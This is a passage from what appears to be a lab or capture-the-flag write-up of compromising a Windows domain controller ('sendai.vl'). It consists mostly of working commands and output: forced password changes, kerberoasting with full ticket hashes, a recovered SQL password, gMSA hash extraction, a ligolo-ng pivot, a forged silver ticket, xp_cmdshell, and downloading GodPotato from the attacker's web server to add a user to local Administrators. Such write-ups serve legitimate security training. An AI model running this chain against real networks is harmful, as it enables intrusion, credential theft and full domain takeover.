+SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE</code></pre><p>The users <code>elliot.yates</code> and <code>thomas.powell</code> are open to compromise via a password change</p><h3>Compromising <code>elliot.yates</code> and <code>thomas.powell</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u elliot.yates -p &#39;&#39; -M change-password -o NEWPASS=Ethan-hacked-you69
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for elliot.yates</code></pre><p>This changed the password of <code>elliot.yates</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u thomas.powell -p &#39;&#39; -M change-password -o NEWPASS=Ethan-hacked-you69
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 
+CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for thomas.powell</code></pre><p>Now both passwords are changed i can check my access over SMB And also try some kerberoasting</p><h2>Kerberoasting</h2><p>So now i have creds i can try some kerberoasting</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap DC.sendai.vl -u elliot.yates -p &#39;Ethan-hacked-you69&#39; --kerberoasting kerb.hash
+LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:Ethan-hacked-you69 
+LDAP        10.129.234.66   389    DC               [*] Skipping disabled account: krbtgt
+LDAP        10.129.234.66   389    DC               [*] Total of records returned 2
+LDAP        10.129.234.66   389    DC               [*] sAMAccountName: mgtsvc$, memberOf: CN=Remote Management Users,CN=Builtin,DC=sendai,DC=vl, pwdLastSet: 2023-07-11 14:06:05.143133, lastLogon: &lt;never&gt;
+LDAP        10.129.234.66   389    DC               $krb5tgs$18$hostmgtsvc.sendai.vl$SENDAI.VL$*sendai.vl\mgtsvc$*$3847cf7f30c6137de22ef772$8394a1aeee95206c84d8e5448e5193294b71349c6cdd84b26beed51be11b76a3c97057f94da337161ea8bd8bee5bbcf14ced870237f9de9f7c821ada9a60d7d39c79d7d2916c93b3af517fee78ecfda2ca03ef81c311ef027a31ec77dffbaa4b51025926556c1b1a871044984993e8c07cdcaa6e50df8ea8c0cf23625a94f295d2ffbb67e0f62270d6eeafd6ac3a588a45da0f3592f1bf10d5db4c5b98fe7c54fae76a30fc67a67e93e057339d78a9c455e5240230ab7962cb95fd29d496239a630ed489f75e6dc53aa1e7a94ec789c2798a22caa6afcaff434e4d43040bbf1daf4eac5e15a4ddeb5a8db55a08d49a93040e15907820a52c13e92addad8e89620eabc8469c8c55c944bd4d5e7ee78bce387d82b85d9fb888ccb88059e012038319714def91b1de93652e2161f00decc85a881349cdc26a416e322cff815e510f1e7338947c744b3f0393cc8299c11520444e91daf3df749f6a8ec3ea61d63f23f0de276cae41a4f26b1a6df224c103c731b44a566ad78922dc9e3db5c3ca5c1538e3f4982cfb48c263ee018112ce4ad1789b89863d73f371afcb580fdce92453b13cde2bff64a4d536780ec730f866477e32b9c508341f80ffaea213c0d80a71a7d51e0dad3efc523a58aa87096bc00c52bcb4b2552864156278b9f52395695e8c3c0a206653d85a90403671426bba83212f725785f00b04f9f6d1e968c942c7e7beaab2500c07e903adeda38418d2d76366068fae02812a2c398ee04d0f30ca5e01c3d2628404a246cd4d084b1d03a7aeac5e651beb02ddf4cc31c6b4208b52e7cee7d68bc8bdd6d4aed3f7d43823d6407df844e8652dbce890a1887e5665724ee594d9cc70df9fbbd1896fc6f22bb0f3c9c6c501e79749d49b79d1a174edf7570208d689f21e3ed76e3b1c4612378497fef263676a9cce00f8f8dda3e98ff5258989736d12ea91ea7389d916f28e05133c36bcbb397737e18255d354c0f94ae3271360622622e1563486c450c4449ef0f7478e12172748cafbda69d12f6a2d0ee62bacc9539b6c91a683cb3a9bad9233cfcd9aa7cd3c4d40ae2d80706d01d07d850a6599daaeb112925fbb1b92c9bc8f1b383678259c6b152e2875c44cb3e6988ed828cdfb10e4dcee12a156630bb6c083d89683a08ece1c4ad1f6fd3a74a86bbd130c6687e91f9463b9ad33c8a7d2a8c2d2c1edc440b4d68abe062b701bacdcca3a0c683645c26abcc5d5d3071ffe92fec5d36ca678110fa9db452792b99ba89d27346259d42961fdff65f3327aec7c3eccb610383e8173bdccfc79dad5e926c96d342695430516d1e58d19734f9ea568f6dfc87a7ee2914ad9b6576d2f2b634c13c0db968f5e583d42dfae05b78f28be0c320a636925c34364017c7ce1090561a790f44a7a799eb6f404ddddd070702970063b5d883420f5880d05de07145a605730bc0bde52762e8934f9d7e307f9f2ac19aba11b4208b92274e490beac2b4953fde621cfc7bb5ba91fbe88f692db379c21cf87b47659e732b61acac1dc031501f65977
+LDAP        10.129.234.66   389    DC               [*] sAMAccountName: sqlsvc, memberOf: [], pwdLastSet: 2023-07-11 10:51:18.413329, lastLogon: 2026-03-03 14:55:26.842948
+LDAP        10.129.234.66   389    DC               $krb5tgs$23$*sqlsvc$SENDAI.VL$sendai.vl\sqlsvc*$e6b027eeb28502408b076c9b9ead9d04$f7b3d84dbd3ae2459858ec9fa38db9c7ef79b43280261d9632e677e0230990794de3861060123aad944ea08bd6b51872fda71a2c008229da6bb8047f31e6370a86c4bb0fa6d9418046894b247ed2d851b08192d81aefa37880c6bf6b7244b3f9c4f8752e4661588c9770d956389071308980ec3fc7a0c55bbf4b6e7d9613650b62cd295526affb4e8f37192b74b17c0f51e424814726a721b255fca41f2a127a7fd8c88a61e458f231fae89f7eb30cda5108650815c71655b46ced8e4bf4782e9b4127c58926f6f45517d7438bcd95e491eedc885266691ad89226f6715f01504d86f7c8ee4f61cf711b30368d37ff1867e5cfa67c92206a6b79857524c5b8a507b566ad6905a3b2c7bd6bd20f9d5e6cebca2977516e1c38892858040656fb787a344cb3739db200736ea409d5e31686792c450ea56f2faacc624b97b48e066d70b3da4c5091913e71c41fad3dd482489259c2bc035cae6d83da9f985a966f86a23f98a0432a7d307616c91dffecb2b2e6b139bbfb0fddd023925f95cee8a5f689ef4181c5f9755d2108c475a6491f26844729f634b9497d0f197deae8af9caf1d17116510ac827b8922fa8a536caacbbd06d8fe32bf91a8f86557b443cfab401bc3cc7b3a745827c77d17725347de566f97753f5fd06ecf7f849b86f05588344d01a0795a81640fd0b980abe9f330f2d045c3fdee4b8f9e1a67b377caecf3a86267365206e2523513e918bd31881be99a7e6047aba0933dc2d27a0ef27f8106c6baaa2c3425e878573488fad01cdf0dd008bc94158b08136a3cf160441ad6a5ab6b7c3276dda5a689e1a553a18aa9f8517b77098f8df31a97705e004b6892774523e7269d344a609a5f05bf8b4d19646291171212f3b01a82cdeb1d12400c8efe51da469e4c6dffd79b00a8e936df0525bb06b3169edc95f41e2e57085e35bd3eceba60d8e390cb748dd48491a959df732a98fc8a9b063d14b65e1da89339927dc9a1309c037b5600b592daeff940c954b94348f1bc211c2787d60c5fbc9e8fa019341e7e79809dd47d419994043a9499e17ef25e2566599c87ee579ac1440ca69b0f706e512193fd965050d584b36873859d30d84811f1eb224fd489b8ea897f16ad1d0941330130cf2a3855126cfa328cfd7e4d59540e83e0c20ef61449f9ffd11f84bf2363ca8095100864910b98753014b37bd9eea8e3c91cd856fd9d050a80ba7d87d013d6029bc5b14ef7ae2e7775d4b2464bd49d8686fbb96b814603c40a3d6f20bb20e934c3bf915f96d5bc94d9a621685cd2acd2e313a0cdadb64467f83b9954efb015f2516dc8d0a609b8963e5ca0341817ef1a88e09b1b9af21e662d550a9e16a42ac22ac46fc83005f3372361d095505108dfc1d6b2d2ced20c6c8b72c24ba0ec1b3e6c09bae36dc693c1f5f7c0296c1deb2053ca61ef22711c0d6cefb71cf8d2e122f950203beb8deccb98db1317a423d136feec2aefd771b9808c7c8ec4d489186441c1c92c882daad16e665db91d169aac2545bbcfe6b9d62f40f8c54d60</code></pre><p>Looks like ive found some hashes, lets try to crack them</p><h3>Cracking the hashes</h3><p>So neither one of the hashes cracked, so ill revisit the access i have with the two compromised users</p><h2>Access to SMB shares with compromised accounts</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u elliot.yates -p &#39;Ethan-hacked-you69&#39; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\elliot.yates:Ethan-hacked-you69 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config          READ,WRITE      
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
+SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</code></pre><p>Elliot has high access on these shares</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u thomas.powell -p &#39;Ethan-hacked-you69&#39; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\thomas.powell:Ethan-hacked-you69 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config          READ,WRITE      
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
+SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</code></pre><p>Thomas also has the same access</p><h3><code>config</code> share</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient \\\\DC.sendai.vl\\config -U &#39;elliot.yates&#39;%&#39;Ethan-hacked-you69&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Mar  3 15:40:01 2026
+  ..                                DHS        0  Wed Apr 16 03:55:42 2025
+  .sqlconfig                          A       78  Tue Jul 11 13:57:11 2023
+
+		7019007 blocks of size 4096. 1236365 blocks available
+smb: \&gt; get .sqlconfig 
+getting file \.sqlconfig of size 78 as .sqlconfig (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
+smb: \&gt; </code></pre><p>Found a sql config file I also have write access on this share so it might be worth running a watering hole attack on both shares i have write access on</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat .sqlconfig                      
+Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;</code></pre><p>Found a password its worth running a password spray on this, even though im pretty sure its for the sql service account So this password is for the sql service account, but since there are no SQL services open externally i cant do a lot with this right now</p><h2>Bloodhound</h2><p><img src="images/sendai/pasted-image-20260406002602.webp" alt="Screenshot" loading="lazy" /> So the user <code>elliot.yates</code> has GenericAll on <code>admsvc</code> OU and also the <code>admsvc</code> group <code>Thomas.powell</code> also has the same access, so it does not matter which user i use Its also worth noting that the <code>admsvc</code> group has readGMSApassword on the account <code>mgtsvc$</code></p><h2>Compromising <code>mgtsvc</code></h2><p>The first step is to add one of the compromised users to the <code>admsvc</code> group, i can then read the GMSA password of <code>mgtsvc</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group addmem &quot;admsvc&quot; &quot;elliot.yates&quot; -U &quot;sendai.vl&quot;/&quot;elliot.yates&quot;%&#39;Ethan-hacked-you69&#39; -S &quot;DC.sendai.vl&quot;</code></pre><p>This added the user to the group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap DC.sendai.vl -u elliot.yates -p &#39;Ethan-hacked-you69&#39; --gmsa                                        
+LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:Ethan-hacked-you69 
+LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
+LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: 1cee4a65ef4459e44eb0031cc640ba18     PrincipalsAllowedToReadPassword: admsvc</code></pre><p>Now i have the NTLM hash of the user <code>mgtsvc</code> I can now use this to look at their access So this user does not have any extra access on SMB</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc winrm DC.sendai.vl -u mgtsvc$ -H &#39;1cee4a65ef4459e44eb0031cc640ba18&#39;     
+WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.234.66   5985   DC               [+] sendai.vl\mgtsvc$:1cee4a65ef4459e44eb0031cc640ba18 (Pwn3d!)</code></pre><p>This user does have access over winrm however</p><h2>Internal SQL service</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mgtsvc$&gt; netstat -ano | findstr &#39;LISTENING&#39;
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       680
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       932
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       680
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       680
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       932
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       680
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1556</code></pre><p>I found a SQL password stored in a smb share earlier And there is an internal SQL service on 1433 I can access this service using ligolo-ng</p><h2>Using ligolo-ng to access internal SQL service</h2><p>First ill transfer the agent.exe to the winrm session</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...</code></pre><p>This setup a server on my machine to host the agent</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; wget http://10.10.14.69:1337/agent.exe -o agent.exe
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; dir
+
+
+    Directory: C:\Users\mgtsvc$\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          3/3/2026   8:19 AM        7302656 agent.exe</code></pre><p>This fetched the file to the target, now i can setup the proxy on my attacker machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo ./proxy -selfcert
+
+ligolo-ng » ifcreate --name sendai
+INFO[0073] Creating a new sendai interface...           
+INFO[0073] Interface created!                           
+ligolo-ng » route_add --name sendai --route 240.0.0.1/32
+INFO[0114] Route created.                               
+ligolo-ng »  </code></pre><p>This has setup the right routing now i just need to execute it on the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; ./agent.exe -connect 10.10.14.69:11601 --ignore-cert
+agent.exe : time=&quot;2026-03-03T08:30:52-08:00&quot; level=warning msg=&quot;warning, certificate validation disabled&quot;
+    + CategoryInfo          : NotSpecified: (time=&quot;2026-03-0...ation disabled&quot;:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time=&quot;2026-03-03T08:30:52-08:00&quot; level=info msg=&quot;Connection established&quot; addr=&quot;10.10.14.69:11601&quot;</code></pre><p>This command connected back to me now i should be able to access the internal service</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ligolo-ng » INFO[0204] Agent joined.                                 id=0050569468eb name=&quot;SENDAI\\mgtsvc$@dc&quot; remote=&quot;10.129.234.66:52534&quot;
+ligolo-ng » session
+? Specify a session : 1 - SENDAI\mgtsvc$@dc - 10.129.234.66:52534 - 0050569468eb
+[Agent : SENDAI\mgtsvc$@dc] » tunnel_start --tun sendai
+INFO[0293] Starting tunnel to SENDAI\mgtsvc$@dc (0050569468eb) 
+[Agent : SENDAI\mgtsvc$@dc] » </code></pre><p>This section shows me starting the tunnel to reach the internal service</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mssqlclient.py -windows-auth sendai.vl/sqlsvc:SurenessBlob85@240.0.0.1
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SENDAI\sqlsvc  guest@master)&gt; </code></pre><p>Now on my machine if i use the ip <code>240.0.0.1</code> i can reach the internal service As this current user i cant enable xp_cmdshell So ill have to find a way to access this service as the administrator After looking at bloodhound i found a listed SPN for the SQL service account which means i should be able to request a silver ticket</p><h2>Silver ticket</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo -n &quot;SurenessBlob85&quot; | iconv -t utf16le | openssl dgst -md4
+MD4(stdin)= 58655c0b90b2492f84fb46fa78c2d96a</code></pre><p>This has generated the hash for me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ticketer.py -nthash 58655c0b90b2492f84fb46fa78c2d96a -domain-sid S-1-5-21-3085872742-570972823-736764132 -domain sendai.vl -spn MSSQL/dc.sendai.vl administrator
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sendai.vl/administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in administrator.ccache</code></pre><p>This has create a administrator.ccache which i can use to access the database as the administrator Now after exporting the ccache i can access the service as the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mssqlclient.py sendai.vl/administrator@DC.sendai.vl -k -no-pass -target-ip 240.0.0.1
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SENDAI\Administrator  dbo@master)&gt; enable_xp_cmdshell
+INFO(DC\SQLEXPRESS): Line 185: Configuration option &#39;show advanced options&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC\SQLEXPRESS): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.</code></pre><p>There was a conflict with the domain <code>sendai.vl</code> and the ip address used <code>240.0.0.1</code> which means i had to temporarily change the ip address in /etc/hosts Here ive enabled xp_cmdshell Now its enabled i can use nxc to run commands</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc mssql 240.0.0.1 -k --use-kcache -x &#39;whoami /priv&#39; 
+MSSQL       240.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
+MSSQL       240.0.0.1       1433   DC               [+] sendai.vl\administrator from ccache (Pwn3d!)
+MSSQL       240.0.0.1       1433   DC               [+] Executed command via mssqlexec
+MSSQL       240.0.0.1       1433   DC               PRIVILEGES INFORMATION
+MSSQL       240.0.0.1       1433   DC               ----------------------
+MSSQL       240.0.0.1       1433   DC               Privilege Name                Description                               State
+MSSQL       240.0.0.1       1433   DC               ============================= ========================================= ========
+MSSQL       240.0.0.1       1433   DC               SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+MSSQL       240.0.0.1       1433   DC               SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+MSSQL       240.0.0.1       1433   DC               SeMachineAccountPrivilege     Add workstations to domain                Disabled
+MSSQL       240.0.0.1       1433   DC               SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+MSSQL       240.0.0.1       1433   DC               SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+MSSQL       240.0.0.1       1433   DC               SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+MSSQL       240.0.0.1       1433   DC               SeCreateGlobalPrivilege       Create global objects                     Enabled
+MSSQL       240.0.0.1       1433   DC               SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre><p>As seen here the <code>SeImpersonatePrivilege</code> is enabled which means i can run GodPotato</p><h2>GodPotato</h2><p>First ill download the .exe from github Now its downloaded ill start a web server on my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...</code></pre><p>This will host the .exe file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc mssql 240.0.0.1 -k --use-kcache -x &quot;powershell -c \&quot;Invoke-WebRequest -Uri http://10.10.14.69:1337/GodPotato-NET4.exe -OutFile C:\Users\sqlsvc\Documents\GodPotato.exe\&quot;&quot;
+MSSQL       240.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
+MSSQL       240.0.0.1       1433   DC               [+] sendai.vl\administrator from ccache (Pwn3d!)
+MSSQL       240.0.0.1       1433   DC               [+] Executed command via mssqlexec</code></pre><p>This fetched the file from my webserver and stored it in the <code>sqlsvc</code> documents folder</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc mssql 240.0.0.1 -k --use-kcache -x &#39;C:\Users\sqlsvc\Documents\GodPotato.exe -cmd &quot;net localgroup Administrators mgtsvc$ /add&quot;&#39;     
+MSSQL       240.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
+MSSQL       240.0.0.1       1433   DC               [+] sendai.vl\administrator from ccache (Pwn3d!)
+MSSQL       240.0.0.1       1433   DC               [+] Executed command via mssqlexec
+MSSQL       240.0.0.1       1433   DC               [*] CombaseModule: 0x140729902104576
+MSSQL       240.0.0.1       1433   DC               [*] DispatchTable: 0x140729904691528
+MSSQL       240.0.0.1       1433   DC               [*] UseProtseqFunction: 0x140729903984832
+MSSQL       240.0.0.1       1433   DC               [*] UseProtseqFunctionParamCount: 6
+MSSQL       240.0.0.1       1433   DC               [*] HookRPC
+MSSQL       240.0.0.1       1433   DC               [*] Start PipeServer
+MSSQL       240.0.0.1       1433   DC               [*] Trigger RPCSS
+MSSQL       240.0.0.1       1433   DC               [*] CreateNamedPipe \\.\pipe\93260372-c269-4866-980b-221c78e754bf\pipe\epmapper
+MSSQL       240.0.0.1       1433   DC               [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+MSSQL       240.0.0.1       1433   DC               [*] DCOM obj IPID: 00001402-073c-ffff-f882-7aed380b6c32
+MSSQL       240.0.0.1       1433   DC               [*] DCOM obj OXID: 0x9f81df10ed82aa3
+MSSQL       240.0.0.1       1433   DC               [*] DCOM obj OID: 0xc93090e203320513
+MSSQL       240.0.0.1       1433   DC               [*] DCOM obj Flags: 0x281
+MSSQL       240.0.0.1       1433   DC               [*] DCOM obj PublicRefs: 0x0
+MSSQL       240.0.0.1       1433   DC               [*] Marshal Object bytes len: 100
+MSSQL       240.0.0.1       1433   DC               [*] UnMarshal Object
+MSSQL       240.0.0.1       1433   DC               [*] Pipe Connected!
+MSSQL       240.0.0.1       1433   DC               [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+MSSQL       240.0.0.1       1433   DC               [*] CurrentsImpersonationLevel: Impersonation
+MSSQL       240.0.0.1       1433   DC               [*] Start Search System Token
+MSSQL       240.0.0.1       1433   DC               [*] PID : 932 Token:0x784  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+MSSQL       240.0.0.1       1433   DC               [*] Find System Token : True
+MSSQL       240.0.0.1       1433   DC               [*] UnmarshalObject: 0x80070776
+MSSQL       240.0.0.1       1433   DC               [*] CurrentUser: NT AUTHORITY\SYSTEM
+MSSQL       240.0.0.1       1433   DC               [*] process start with pid 4696
+MSSQL       240.0.0.1       1433   DC               The command completed successfully.</code></pre><p>This command used GodPotato and added the user <code>mgtsvc$</code> to the administrators group, so now if i open a new session on winrm i should be an administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i DC.sendai.vl -u mgtsvc$ -H &#39;1cee4a65ef4459e44eb0031cc640ba18&#39;               
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
